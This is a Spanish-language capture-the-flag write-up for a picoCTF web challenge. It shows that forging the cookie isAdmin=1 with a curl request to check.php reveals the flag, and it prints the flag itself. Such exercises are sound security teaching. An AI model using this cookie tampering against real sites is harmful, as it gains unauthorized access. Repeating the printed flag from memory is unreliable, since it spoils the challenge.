## Objetivo
Can you get the flag? Go to this website and see what you can discover.
http://saturn.picoctf.net:57741/

## Pistas
Do you know how to modify cookies?

## Solución
Si nosotros nos ponemos a inspeccionar el código podemos observar que el código guest.js muestra lo siguiente
```js
function continueAsGuest()
{
  window.location.href = '/check.php';
  document.cookie = "isAdmin=0";
}
```

Podemos ver que contiene una cookie con el valor de administrador en 0, si nosotros utilizamos una herramienta como curl, podemos enviar cookies modificadas para que el archivo nos muestre la bandera que estamos buscando.

```cmd
C:\Users\mgarcia>curl -s http://saturn.picoctf.net:57741/check.php -H "Cookie: isAdmin=1"
<html>
<body>

<p>picoCTF{gr4d3_A_c00k13_5d2505be}</p>

</body>
</html>

C:\Users\mgarcia>
```

## Notas adicionales
## Referencias